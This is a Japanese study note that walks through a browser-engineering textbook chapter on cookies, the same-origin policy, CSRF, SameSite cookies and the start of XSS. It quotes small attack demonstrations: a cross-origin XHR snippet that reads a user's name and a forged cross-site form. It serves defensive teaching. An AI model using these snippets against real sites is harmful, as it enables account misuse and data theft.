# ブラウザを自作して学ぶクライアントサイド防御 ― Cookie から CSP までの因果の連鎖

> **この節で分かること**
> - なぜ「ブラウザは魔法ではなくコードである」と考えると脆弱性が見えやすくなるのかを説明できる
> - Cookie がブラウザに与える「サーバ発行の身元」であり、それを盗む攻撃が生まれる理由を説明できる
> - 同一オリジンポリシー・CSRF・SameSite Cookie・XSS・CSP が、どの機能追加を防ぐために順番に生まれたのかを因果としてたどれる
> - ゲストブックという小さな Web アプリを題材に、攻撃コードと防御コードの両方を読み解ける
> - 「機能を足すたびに防御責任が増える」という一貫した設計原理を、自分の診断対象にあてはめて考えられる

**元資料**: https://browser.engineering/security.html （第10章 "Keeping Data Private"。原典サイトのレンダリング済みページは取得できず、同書公式ソースリポジトリ `https://github.com/browserengineering/book`（commit `c8c6d34b636a0fec3589a4a2e901916c774f1929`）の原稿 `book/security.md` とソースコードを直接読んで再構成した）
**関連する節**: 同一オリジンポリシー、Cookie、CSRF、XSS、Content-Security-Policy を扱う各節

---

## 1. この教材はどういう本か ― 「謎をコードに置き換える」

まず出典となった本そのものを押さえておく。*Web Browser Engineering*（著: Pavel Panchekha & Chris Harrelson）は、「ブラウザは魔法ではなくコードである」ことを示すために、**ネットワークから JavaScript まで動く小さな実ブラウザを、数千行の Python 3 で一から組み立てる**教科書である。原書は Oxford University Press から、日本語版はオライリー・ジャパン（`https://www.oreilly.co.jp/books/9784814401574/`）から出ている。

著者の動機は明快だ。計算機科学の学位課程には伝統的に OS・コンパイラ・データベースの講義があり、それらは「謎をコードに置き換える（replace mystery with code）」。Linux も Postgres も LLVM も、理解可能なコアアーキテクチャに分解できる。ところが**ブラウザだけは、学生にも業界プログラマにも研究者にも、いまだに不透明（opaque）なまま**だ、という。本書はその謎を、全主要コンポーネントを体系的に実装することで払おうとする。

### 規模と設計原則

- Part 1〜3 で**約1000行**のコードのブラウザを構築する。演習をやると倍になる。
- 平均して**1章あたり4〜6時間**（数年のプログラミング経験者が読み・実装し・デバッグする時間）。
- Part 4 まで含めた最終形は**約3000行**。
- 設計原則は「あなたのブラウザは各ステップで『動く』し、各章は前章の上に積み上がる」。章ごとに動くブラウザが残る（`src/lab1.py` 〜 `lab16.py`）。

### この教材ブラウザを「どこまで信用してよいか」

クライアントサイド脆弱性ハンティングの教材として使ううえで、著者自身の自己制約が決定的に重要だ。本書のブラウザについて、著者は次のように明言している（原文）。

> This book's browser is irreverent toward standards: it handles only a sliver of the full HTML, CSS, and JavaScript languages, mishandles errors, and **isn't resilient to malicious inputs**.

つまり**この教材ブラウザは悪意ある入力に対して堅牢ではない**。エラー処理もいい加減で、標準のごく一部しか扱わない。しかし著者は同時に、**アーキテクチャは実ブラウザと一致しており、1000万行級の巨大実装を理解する足がかりになる**とも述べている。ここが本節のねらいだ。個々の実装は簡略化されていても、**「どの機能がどの防御を要求するか」という因果の骨格は実ブラウザと同じ**なのである。

〔補足〕本書は明確に「Web アプリケーションセキュリティの教科書ではない」と繰り返し警告している。TLS の詳細やプライバシー、third-party cookie、フィンガープリンティングなどは意図的に割愛されている。本節も同様に、防御の「考え方の骨組み」を得るための入り口として読んでほしい。

> ### 📌 ここは自分で開いて読んでください
> **資料**: 第10章 Keeping Data Private（本節の中心資料）— https://browser.engineering/security.html
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で `browser.engineering:443` が 403 で拒否された）。以下の記述は、公式ソースリポジトリを clone して得た原稿 `book/security.md` とソースコードにもとづく要約である。ただし**ページ上のレイアウト・アニメーション図・インタラクティブなウィジェットの操作感はソースには含まれない**。
> **読みどころ**:
> 1. `Same-origin Policy` → `Cross-site Request Forgery` → `SameSite Cookies` → `Cross-site Scripting` → `Content Security Policy` という**節の並び順そのもの**。機能追加が防御を要求する因果の連鎖が教材になっている
> 2. 章末6問の演習（`document.cookie`／`HttpOnly`、CORS、`Referrer-Policy`）。診断者が手を動かす題材として優秀
> 3. 章頭と章末の2つの warning ボックス。「この本だけでは十分でない」という著者の境界設定
> **代替手段**: 日本語で読みたい場合はオライリー・ジャパン版（`https://www.oreilly.co.jp/books/9784814401574/`）。clone できる環境なら `git clone https://github.com/browserengineering/book` で原稿・コード・図版が一括で手に入る。

---

## 2. 第10章の全体地図 ― 因果の連鎖として読む

第10章の副題は "Cookies and logins, XSS and CSRF"。導入文（原文）はこの章の論理を一文で言い切っている。

> Our browser has grown up and now runs (small) web applications. With one final step---user identity via cookies---it will be able to run all sorts of personalized online services. **But capability demands responsibility**: our browser must now secure cookies against adversaries interested in stealing them.

「能力は責任を要求する（capability demands responsibility）」。この章はこの原理を、**新機能を足した瞬間に必要になる防御をコードで追体験させる**構成になっている。並び順を先に地図として示す。

```
Cookie を足す
  └─ Cookie は盗まれうる（ブラウザの身元だから）
      ├─ XMLHttpRequest を足す ── 他サイトから自分のデータを読めてしまう
      │     └─ 防御: 同一オリジンポリシー（Same-Origin Policy）
      ├─ フォーム送信は同一オリジンポリシーの対象外 ── CSRF
      │     ├─ 防御(サーバ側): nonce
      │     └─ 防御(ブラウザ側): SameSite Cookie ← 多層防御
      └─ 自サイトにデータが code として注入される ── XSS
            ├─ 防御(基本): エスケープ
            └─ 防御(追加層): Content-Security-Policy
```

この節では、この地図を上から順にたどる。各トピックは「**なぜそうなっているのか → どう動くのか → 攻撃者はどこを突くのか → どう守るのか**」の順で見ていく。

### 用語の下準備

- **オリジン（Origin）とは**、`scheme + host + port`（例: `http://localhost:8000`）の3つ組で決まる「Web 上の身元単位」のこと。あとで出てくる同一オリジンポリシーの基準になる。
- **サイト（Site）とは**、Cookie の世界で使われる別の「身元単位」で、こちらは**scheme も port も見ない**。この2つの定義のズレが、実務での混乱の元になる。あとで詳しく見る。

---

## 3. Cookie ― サーバがブラウザに与える「身元」

### なぜ Cookie が要るのか（設計意図）

ここまでの実装では、サーバは2つの HTTP リクエストが同じユーザから来たのか別のユーザから来たのか判別できない。ブラウザは事実上**匿名**なのだ。だから、どこにも「ログイン」できない。ログイン済みユーザのリクエストを、未ログインユーザのリクエストと区別できないからである。

〔補足〕ここでいう「匿名」は善意の意味での匿名だ。著者は脚注で、悪意ある攻撃者に対しては**ブラウザフィンガープリンティング**（ブラウザの細かな設定差で個体を見分ける手法）などで区別できてしまう、と留保している。「ログインの仕組みが無い＝完全に追跡不能」ではない点に注意。

### Cookie とは何か（仕組み）

Cookie の定義（原文）はこうだ。

> A cookie---the name is meaningless, ignore it---is a little bit of information stored by your browser on behalf of a web server. ... In effect, **a cookie is a decentralized, server-granted identity for your browser**.

つまり **Cookie とは、Web サーバの代わりにブラウザが保存する小さな情報で、実質的には「サーバが発行した、ブラウザの分散的な身元」のこと**。仕組みは単純で、次の2つのヘッダのやりとりに尽きる。

1. HTTP レスポンスに `Set-Cookie` ヘッダを入れると、ブラウザはそのキー・値のペアを記憶する。
2. ブラウザは、**同じサーバへの次のリクエスト**に、記憶した値を `Cookie` ヘッダとしてエコーバックする。

ヘッダの実例（原文のまま）。

```
Set-Cookie: foo=bar
```
```
Cookie: foo=bar
```

この往復を図にすると、原稿の Figure 1（`im/security-cookies-2.gif`）は次のような時系列になっている。

```
Browser                         Server
  |  --- GET / ------------------->  |
  |  <-- Set-Cookie: ... ----------  |   ← サーバが身元を割り当てる
  |  --- GET /login  + Cookie: ... ->|   ← 2回目以降は自動で cookie が載る
  |  <-- <form...> ----------------  |
```

図の主眼は**3本目の矢印**にある。**ブラウザは「送れ」と指示されなくても、同じサーバへの次のリクエストに Cookie を自動で付ける**。この「自動付与」こそが、後段の CSRF の前提になる。ここを頭に入れておくと、CSRF 節の理解が一気に速くなる。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Cookie 節と SPA 節のアニメーション図 — https://browser.engineering/security.html （`im/security-cookies-2.gif` と `im/security-spa-2.gif`）
> **なぜ**: 図の**実体は GIF 画像**で、Markdown ソースには含まれない。何がどの順で現れるかという動きは、静止した合成像からは確定できなかった。
> **読みどころ**:
> 1. Cookie 図で「2回目以降のリクエストに Cookie が自動で載る」という往復のタイミング
> 2. SPA 図で `XMLHttpRequest` を使うページがどうサーバとやりとりするか
> **代替手段**: clone した `www/im/` ディレクトリに GIF 実体があるので、ローカルで画像として開いて確認できる。

### サーバ側のコード（どう動くか）

原文では、サーバ側がリクエストの Cookie を見てトークンを取り出すか、無ければ新規に生成する。

```python
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

新規訪問者にだけ `Set-Cookie` を返す。

```python
def handle_connection(conx):
    # ...
    if "cookie" not in headers:
        template = "Set-Cookie: token={}\r\n"
        response += template.format(token)
    # ...
```

トークンをキーにして、サーバ側にセッションデータを持つ。

```python
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

### 攻撃者はどこを突くか ― トークンの乱数品質

ここに、診断者が真っ先に覚えるべき落とし穴がある。上のコードは `random.random()` でトークンを作っているが、原文はこれを厳しく戒めている（原文）。

> This `random.random` call returns a decimal number with **53 bits of randomness**. That's not great; **256 bits is typically the goal**. And `random.random` is **not a secure random number generator**: by observing enough tokens you can predict future values and use those to hijack accounts.

要点を表にする。

| 論点 | 本書の実装 | 現実に求められる水準 |
| --- | --- | --- |
| 乱数のビット数 | `random.random()` は53ビット | **256ビット**が目安 |
| 乱数生成器の種類 | 暗号学的に安全でない | **暗号学的に安全な乱数生成器（CSPRNG）**が必須 |
| 攻撃可能性 | 十分な数のトークンを観測すれば将来値を予測できる | 予測不能でなければならない |

つまり**トークンや session id は「暗号学的に安全な乱数」で作らないと、観測からアカウント乗っ取りにつながる**。バグバウンティでセッション管理を見るとき、まずここを疑うのは理にかなっている。

### Cookie に何を入れるべきか

原文は Cookie の中身についても釘を刺している（原文）。

> It's therefore wise to **store user data on the server, and only store a pointer to that data in the cookie**. And, since cookies are stored by the browser, **they can be changed arbitrarily by the user, so it would be insecure to trust the cookie data**.

- ヘッダ長には制限があり、Cookie は毎リクエスト往復するので、**Cookie は最小限にし、実データはサーバに置いてポインタだけ持つ**のが賢い。
- **Cookie はブラウザが保存するので、ユーザが任意に書き換えられる**。だから **Cookie の中身を信用するのは危険**。

〔補足〕この「クライアント側にあるものは信用しない」は、クライアントサイド脆弱性ハンティング全体を貫く原則だ。Cookie に権限フラグ（`isAdmin=false` など）を直接入れているアプリは、その時点で疑わしい。

〔補足〕Cookie という名前に意味は無い。原文の further ボックスによれば、元の仕様（`https://curl.se/rfc/cookie_spec.html`）は「no compelling reason（これといった理由もなく）」でこう呼んだと書いており、不透明な識別子を "magic cookie" と呼ぶ用法は少なくとも1979年、Web 以前の X11 認証（`https://en.wikipedia.org/wiki/X_Window_authorization`）まで遡る。

---

## 4. ログインシステム ― サーバ側に潜む定番の穴

Cookie で身元が持てるようになったので、次はログインを作る。最小要件は原文で次の4点だ。

- ユーザはユーザ名とパスワードでログインする
- サーバはログインが正しいか確認する
- ゲストブックに書き込むにはログインが必要
- サーバは誰がどの投稿をしたかを表示する

### 設計上の急所 ― セッションはサーバ側に置く

ログイン判定のコアはこれだ。

```python
LOGINS = {
    "crashoverride": "0cool",
    "cerealkiller": "emmanuel"
}
```

```python
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

重要なのは、**`user` キーはサーバ側の session データに入る**ことだ（原文）。

> Note that the session data (including the `user` key) is **stored on the server, so users can't modify it directly**.

正しいパスワードを出したときだけ `user` を立てられる。もしこれをブラウザ側（Cookie）に置いていたら、ユーザが自分で `user=admin` と書き換えられてしまう。**「認証の結果はサーバ側に持つ」**という原則がここに現れている。

〔補足〕プリロードされているコメントとユーザ名（`crashoverride` / `cerealkiller` や "HACK THE PLANET!!!"）は、1995年の映画 *Hackers* への目配せである。診断とは関係ないが、原典のコードをそのまま動かすと出てくる。

### このログインに残っている不備（原文の列挙）

原文は、この教材ログインが**わざと省いている**不備を正直に列挙している。診断チェックリストとしてそのまま使える。

> The insecurities include **not hashing passwords, not using [`bcrypt`][bcrypt], not allowing password changes, not having a "forget your password" flow, not forcing TLS, not sandboxing the server**, and many many others.

| 省かれている対策 | なぜ必要か（一般的な理由） |
| --- | --- |
| パスワードのハッシュ化 | 平文保存は漏洩時に即アカウント全滅 |
| `bcrypt` の利用 | 総当たりに強い専用ハッシュが要る |
| パスワード変更フロー | 漏洩後に締め出せない |
| パスワード再発行フロー | 正規ユーザが復帰できない |
| TLS の強制 | 経路上で盗聴される |
| サーバのサンドボックス化 | 侵入時に被害が広がる |

### 攻撃者はどこを突くか ― タイミングサイドチャネル

パスワード比較に `==` を使っているが、原文はこれ自体が脆弱だと注記する（原文）。

> Python's equality function for strings scans the string from left to right, and exits as soon as it finds a difference. Therefore, you get a clue about the password from *how long* it takes to check a password guess; this is called a [timing side channel][timing-attack]. ... a real web application has to do a [constant-time string comparison][constant-time]!

つまり**文字列比較は左から順に進み、違いを見つけた瞬間に止まる**。だから「照合にかかった時間」から、パスワードのどこまで合っていたかが漏れる。これが**タイミングサイドチャネル**（処理時間の差から秘密が漏れる攻撃）だ。対策は**定数時間比較**。参考リンクは `https://en.wikipedia.org/wiki/Timing_attack` と `https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html`。

〔補足〕原文は further ボックスで、TLS クライアント証明書（`https://aboutssl.org/ssl-tls-client-authentication-how-does-it-works/`）や、URL に `username:password@` を書く HTTP 認証（`https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication`）にも触れつつ、「新しいサイトではどちらも（正当な理由なく）使うな」と述べている。

---

## 5. Cookie のブラウザ側実装 ― cookie jar の性質を知る

Cookie を保存するデータ構造は、伝統的に **cookie jar（クッキーの瓶）** と呼ばれる。ブラウザ側の最小実装はこうだ。

```python
COOKIE_JAR = {}
```

```python
class URL:
    def request(self, payload=None):
        # ...
        if self.host in COOKIE_JAR:
            cookie = COOKIE_JAR[self.host]
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

```python
class URL:
    def request(self, payload=None):
        # ...
        if "set-cookie" in response_headers:
            cookie = response_headers["set-cookie"]
            COOKIE_JAR[self.host] = cookie
        # ...
```

このコードから、診断上重要な cookie jar の性質が3つ読み取れる。

### 性質1: cookie jar はグローバル（タブ単位ではない）

原文（原文）:

> Note that the cookie jar is global, not limited to a particular tab. That means that if you're logged in to a website and you open a second tab, you're logged in on that tab as well.

**Cookie はタブをまたいで共有される**。だから別タブで開いた攻撃者ページからでも、あなたのログイン状態を利用したリクエストが飛ばせる。CSRF が成立する土台のひとつだ。

### 性質2: サブリソースにも Cookie が付く

原文（原文）:

> since `request` can be called multiple times on one page---to load CSS and JavaScript---later requests transmit cookies set by previous responses.

1ページを読むと CSS や JavaScript を追加で取得するが、**それらのサブリソース取得にも Cookie が載る**。実際、ゲストブックは最初のページ取得で Cookie を設定し、続く CSS ファイル取得でその Cookie を受け取る。

### 性質3: キーは `self.host` だけ ― origin と定義がズレている

ここが最重要だ。cookie jar のキーは **`self.host`（ホスト名）のみ**で、**scheme も port も含まない**。これは後で出てくる同一オリジンポリシーの origin 定義（`scheme + host + port`）と**意図的に異なる**。この「Cookie のサイト」と「オリジン」のズレは、実務で繰り返し混乱を生む。第7節で正面から扱う。

〔補足〕この教材実装には既知の制約がある。原文は「サーバは1リクエストで複数の `Set-Cookie` を送れるが、本書のブラウザはそれを正しく扱わない」と明言している。実ブラウザとの差分として覚えておくとよい。

そして章の締めが、次の XHR 節への橋渡しになる（原文）。

> the cookie is the browser's identity, so if someone stole it, the server would think they are you. **We need to prevent that.**

---

## 6. XMLHttpRequest ― 新機能が防御を要求する瞬間

### なぜここで危険が生まれるのか

Cookie はサイト固有なので、あるサーバの Cookie が別のサーバに送られることはない。しかし原文は警告する（原文）。

> But if an attacker is clever, they might be able to get *the server* or *the browser* to help them steal cookie values.

そして核心の一文（原文）。

> The easiest way for an attacker to steal your private data is **to ask for it**.

ブラウザには「他サイトの Cookie を直接よこせ」という API は無い。しかし**他サイトへリクエストを送る API はある**。それが `XMLHttpRequest`（XHR）だ。

### XMLHttpRequest とは（仕組み）

`XMLHttpRequest` とは、**ページの再読み込みなしに JavaScript から HTTP リクエストを送るための API** のこと。原文は意義をこう説明する。

> With `XMLHttpRequest`, a web page can make HTTP requests in response to user actions ... This API, and newer analogs like [`fetch`][mdn-fetch], are how websites allow you to **like a post, see hover previews, or submit a form without reloading**.

利用例（原文）。

```javascript
x = new XMLHttpRequest();
x.open("GET", url, false);
x.send();
// use x.responseText
```

本書は実装を単純にするため**同期版のみ**を作る。ブラウザ側の JS ランタイムとサーバ橋渡しは次の通り。

```javascript
XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}
```

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        headers, out = full_url.request(body)
        return out
```

### 攻撃者はどこを突くか

`XMLHttpRequest` で送る HTTP リクエストには**Cookie が含まれる**。これは設計上そうなっている（「いいね」を押すにはアカウントに紐づける必要があるから）。だが同時に、**XHR が私的データにアクセスできてしまう**ことを意味する。この時点で、防御が必要になった。

〔補足〕原文の further ボックスは診断者に直接役立つ事実を挙げている。`setRequestHeader` / `getResponseHeader` で HTTP ヘッダを操作できるが、**Cookie 機構や他のセキュリティ対策に干渉できてしまう**ため、一部のリクエスト／レスポンスヘッダは JavaScript からアクセスできない（**forbidden header name** / **forbidden response header name**）。関連 URL は次の通り。

| 概念 | URL |
| --- | --- |
| 禁止リクエストヘッダ名 | `https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name` |
| 禁止レスポンスヘッダ名 | `https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name` |
| `fetch` | `https://developer.mozilla.org/en-US/docs/Web/API/fetch` |

---

## 7. 同一オリジンポリシー ― XHR への最初の防御

### 具体的な攻撃シナリオ

ログイン中のゲストブックは、ページに「Hello, so and so」とユーザ名を含む。ということは、**あなたの Cookie 付きでゲストブックを読めば、あなたのユーザ名が判明する**。攻撃者のサイトに次のコードを置けばよい。

```javascript
x = new XMLHttpRequest();
x.open("GET", "http://localhost:8000/", false);
x.send();
user = x.responseText.split(" ")[2].split("<")[0];
```

問題の本質を原文はこう突く（原文）。

> The issue here is that **one server's web page content is being sent to a script running on a website delivered by another server**. Since the content is derived from cookies, this leaks private data.

**あるサーバのページ内容が、別のサーバが配信したサイト上で動くスクリプトに渡ってしまう**。内容は Cookie 由来なので、私的データが漏れる。

〔補足〕「なぜユーザは攻撃者のサイトにいるのか？」への答えも原文にある。面白いミームがあるから、あるいはサイトが乗っ取られて攻撃に使われているから、あるいは悪者がセキュリティ意識の低いサイトに広告を出したから、など。**被害者が攻撃者のページを開くこと自体は難しくない**、という前提を持っておく。

### 同一オリジンポリシーの定義（どう守るか）

**同一オリジンポリシー（Same-Origin Policy, SOP）とは、`XMLHttpRequest` のようなリクエストは同じ「オリジン」のページにしか送れない、という規則のこと**。オリジンは `scheme + host + port` で決まる（原文）。

> browsers have a [*same-origin policy*][same-origin-mdn], which says that requests like `XMLHttpRequest` can only go to web pages on the same "origin"---**scheme, hostname, and port**.

防御実装は、送信先と自分のページのオリジンを比べるだけだ。

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        if full_url.origin() != self.tab.url.origin():
            raise Exception("Cross-origin XHR request not allowed")
        # ...
```

```python
class URL:
    def origin(self):
        return self.scheme + "://" + self.host + ":" + str(self.port)
```

### 同一オリジンポリシーの適用範囲は一様でない

診断で必ず知っておくべき脚注が2つある。まず、**すべてのリクエストが SOP の対象ではない**（原文）。

> Some kinds of request are **not** subject to the same-origin policy (most prominently **CSS and JavaScript files linked from a web page**); conversely, the same-origin policy also governs JavaScript interactions with **`iframe`s, images, `localStorage`** and many other browser features.

つまり `<link>` や `<script src>` で読み込む CSS・JavaScript は SOP の対象外（だから CDN が使える）。一方で `iframe`・画像・`localStorage` との JavaScript のやりとりは SOP の管轄下にある。**「どのリソースが対象で、どれが対象外か」の一覧を持っておくことが、SOP バイパスを探す出発点**になる。

### 「Cookie のサイト」と「オリジン」は別物

第5節で予告したズレが、ここで正式に確認される（原文）。

> You may have noticed that this is not the same definition of "website" as cookies use: **cookies don't care about scheme or port!** This seems to be an oversight or incongruity left over from the messy early web.

対応表にする。

| 判定に使う要素 | オリジン（SOP が使う） | Cookie の「サイト」 |
| --- | --- | --- |
| scheme（http/https） | 見る | **見ない** |
| host（ホスト名） | 見る | 見る |
| port（ポート） | 見る | **見ない** |

この非対称性は「初期 Web の混乱の名残」であり、**Cookie は scheme も port も無視して送られうる**。`http://` と `https://` の間、あるいは違うポート間で Cookie が意図せず共有される――という診断観点はここから来る。

〔補足〕further ボックスは `<canvas>` の taint（汚染）も挙げている。`drawImage` は他オリジンの画像も canvas に描けるが、それを `getImageData` で読み戻せないよう、**クロスオリジン画像を書き込むと canvas は taint され、読み取りメソッドがブロックされる**（`https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image`）。

---

## 8. CSRF ― 同一オリジンポリシーの穴

### なぜ SOP だけでは足りないのか

同一オリジンポリシーはクロスオリジンの `XMLHttpRequest` を止める。しかし原文は決定的な抜け穴を指摘する（原文）。

> the same-origin policy doesn't apply to normal browser actions like clicking a link or filling out a form. This enables an exploit called *cross-site request forgery*, often shortened to CSRF.

**リンクのクリックやフォーム送信という「普通のブラウザ操作」には SOP が効かない**。これが **CSRF（Cross-Site Request Forgery、クロスサイトリクエストフォージェリ）** ―― 攻撃者が用意した仕掛けで、被害者のブラウザに意図しないリクエストを送らせる攻撃 ―― を生む。

### どう動くか

攻撃者は、自分のサイトにゲストブック宛てのフォームを置く。

```html
<form action="http://localhost:8000/add" method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

フォームが攻撃者のサイト上にあっても、submit すればブラウザは**ゲストブックへ HTTP リクエストを出し、第3節で見たとおりゲストブックの Cookie を自動で送る**。だからサーバから見ればログイン済みユーザの正当な投稿に見え、書き込みが通ってしまう。

ユーザが気づけない理由（原文）:

> the user has no way of knowing which server a form submits to---the attacker's web page could have misrepresented that.

さらに悪いことに、**送信は JavaScript で自動発火でき、ユーザが関与しなくてもよい**。入力欄を隠し、投稿内容を事前に埋め、ボタンを普通のリンクに見せかけて偽装できる。

### 被害の性質

攻撃者はレスポンスを読めないので、これ自体は私的データを漏らさない。だが**攻撃者がユーザとして「行動」できる**（原文）。

> posting a bank transaction is [scary]. And if the website has a **change-of-password form**, there could even be a way to take control of the account.

コメント投稿くらいなら大したことはないが、**銀行取引の実行やパスワード変更フォーム**が対象なら、アカウント乗っ取りに直結する。

〔補足〕原文の further ボックスは、CSRF と精神的に似た**クリックジャッキング**（clickjacking）も挙げる。**透明な iframe に入れた外部サイトを攻撃者サイトの上に重ねる**攻撃で、ユーザは一方のサイトを操作しているつもりで別のサイト上で操作してしまう。対策は `Content-Security-Policy` の `frame-ancestors` ディレクティブ、または古い `X-Frame-Options` ヘッダ。関連 URL: `https://owasp.org/www-community/attacks/Clickjacking`、`https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options`。

### どう守るか（1）― サーバ側の nonce

定石は nonce だ。**nonce とは、サーバが各フォームに埋め込む一度きりの秘密値のこと**。正しい nonce を伴わない POST を拒否する（原文）。

> embed a secret value, called a *nonce*, into the form, and to reject form submissions that don't come with the right secret value. **You can only get a nonce from the server, and the nonce is tied to the user session**, so the attacker could not embed it in their form.

発行と検証のコード。

```python
def show_comments(session):
    # ...
    if "user" in session:
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        # ...
        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
```

```python
def add_entry(session, params):
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    # ...
```

nonce にまつわる注意（すべて原文の脚注）:

- **nonce はユーザに紐づけよ。** さもないと「攻撃者が自分用の nonce を発行し、ユーザ向けフォームに差し込む」ことができてしまう。
- **nonce も XSS で盗める。** Cookie と同様、nonce も cross-site scripting で盗まれうる。
- **実運用では1ユーザに複数の有効な nonce を許す**のが普通（2つのタブで2つのフォームを開けるように）。膨張を防ぐため nonce は一定時間で失効させる。

### サーバ側対策の限界

原文はここで重要な一般化をする（原文）。

> But **server-side solutions are fragile (what if you forget a form?)** and relying on every website out there to do it right is a pipe dream. It'd be better for the browser to provide a fail-safe backup.

**サーバ側対策は脆い。フォームを1つ書き忘れたら終わりだ。** すべてのサイトが正しく実装するのは夢物語。だからブラウザ側の**フェイルセーフ（fail-safe、失敗しても安全側に倒れる仕組み）**が欲しい。それが次の SameSite だ。

---

## 9. SameSite Cookie ― ブラウザ側の多層防御

### アイデア（どう守るか）

フォーム送信に対するフェイルセーフが SameSite Cookie だ（原文）。

> The idea is that **if a server marks its cookies `SameSite`, the browser will not send them in cross-site form submissions**.

**サーバが Cookie を `SameSite` と印付けすると、ブラウザはクロスサイトのフォーム送信でその Cookie を送らなくなる**。CSRF の主経路（クロスサイト POST）で Cookie が落ちるので、攻撃者の偽フォームは効かなくなる。

### 値と本書の実装範囲

`SameSite` 属性は `Lax` / `Strict` / `None` を取る。本書は `Lax` と `None` のみ実装し、デフォルトは `None`（原文）。

> When `SameSite` is set to `Lax`, **the cookie is not sent on cross-site `POST` requests, but is sent on same-site `POST` or cross-site `GET` requests**.

挙動をまとめる（原文の記述から構成）。

| リクエストの種類 | `SameSite=Lax` | `SameSite=None`（本書のデフォルト） | `Strict`（本書未実装） |
| --- | --- | --- | --- |
| same-site `GET` | 送る | 送る | 送る |
| same-site `POST` | 送る | 送る | 送る |
| **cross-site `GET`**（リンククリック） | **送る** | 送る | ブロックされる |
| **cross-site `POST`**（CSRF の主経路） | **送らない** | 送る | 送らない |

`Lax` がクロスサイト `GET` を許す理由（原文の脚注）: クロスサイト `GET` は要するに「リンクをクリックすること」で、だから `Lax` では許される。`Strict` はこれも止めるが、そうするとアプリを注意深く設計しないと壊れる。

### 実装の核心

`Set-Cookie` のパラメータを解析し、cookie jar を (値, パラメータ) のペアに変える。

```python
def request(self, payload=None):
    if "set-cookie" in response_headers:
        cookie = response_headers["set-cookie"]
        params = {}
        if ";" in cookie:
            cookie, rest = cookie.split(";", 1)
            for param in rest.split(";"):
                if '=' in param:
                    param, value = param.split("=", 1)
                else:
                    value = "true"
                params[param.strip().casefold()] = value.casefold()
        COOKIE_JAR[self.host] = (cookie, params)
```

送信可否を判定する核心コード。

```python
def request(self, referrer, payload=None):
    if self.host in COOKIE_JAR:
        # ...
        cookie, params = COOKIE_JAR[self.host]
        allow_cookie = True
        if referrer and params.get("samesite", "none") == "lax":
            if method != "GET":
                allow_cookie = self.host == referrer.host
        if allow_cookie:
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

サーバ側で `SameSite=Lax` を付ける。

```python
def handle_connection(conx):
    if "cookie" not in headers:
        template = "Set-Cookie: token={}; SameSite=Lax\r\n"
        response += template.format(token)
```

〔本ノート筆者の観察（原典コードに基づく）〕判定は `self.host == referrer.host` の**ホスト名完全一致のみ**で、scheme も port も、サブドメインの親子関係も見ていない。これは次に述べるブラウザ差の簡略版である。

### 攻撃者はどこを突くか ― 「同一サイト」判定のブラウザ差

ここが、クライアントサイド診断で最も価値のある知識だ。**「同一サイト」の定義はブラウザによって違う**（原文）。

> As I write this, **some browsers also check that the new URL and the top-level URL have the same scheme** and **some browsers ignore subdomains, so that `www.foo.com` and `login.foo.com` are considered the "same site"**.

さらに further ボックス（原文）:

> real browsers support different subsets of the feature or different defaults. For example, **Chrome defaults to `Lax`, but Firefox and Safari do not.** Likewise, **Chrome uses the scheme ... as part of the definition of a "site"** (This is called "schemeful same-site."), but other browsers may not.

要点を表に。

| 論点 | ブラウザ差の例 |
| --- | --- |
| デフォルト値 | Chrome は `Lax` が既定、Firefox / Safari はそうではない |
| scheme を見るか | Chrome は scheme を「サイト」の一部とみなす（schemeful same-site）、他は見ないことがある |
| サブドメイン | `www.foo.com` と `login.foo.com` を「同一サイト」とみなすブラウザがある |
| 判定の基準 | 仕様上は referrer ではなく "top-level site" を使うべき（本書は簡略化して referrer を使用） |

**同じ攻撃が、あるブラウザでは防がれ別のブラウザでは通る**ことがある。診断では「どのブラウザで検証したか」を必ず記録すべき理由がここにある。

〔補足〕SameSite の仕様は原稿執筆時点でまだドラフト段階で、著者自身が「この節は古くなるかもしれない」と注記している。**最新の状況は MDN（`https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite`）で確認する**のが安全だ。

### nonce を消してはいけない

原文は SameSite を**多層防御（defense in depth）**と位置づける。フォームの nonce を書き忘れても CSRF を防ぐフェイルセーフだ。だが（原文）:

> But **don't remove the nonces we added earlier!** They're important for **older browsers** and are **more flexible in cases like multiple domains**.

**nonce も残せ。** 古いブラウザ対応と、複数ドメインのような柔軟性のために両方が要る。これが「多層防御」の実践だ。

---

## 10. XSS ― 自サイトが自分を攻撃する

### なぜ SameSite でも終わらないのか

他サイトは Cookie を悪用できなくなった。ではもう安全か。原文は問い返す（原文）。

> But what about *our own* website? **With cookies accessible from JavaScript, any scripts run on our browser could, in principle, read the cookie value.**

**JavaScript から Cookie が読めるので、ページ上で動くスクリプトは Cookie を読めてしまう**。「でも自分のサイトは `comment.js` しか動かさないのでは？」――ところが、そうとは限らない。

第4節で見たコメント出力コードを思い出す。

```python
out += "<p>" + entry + "\n"
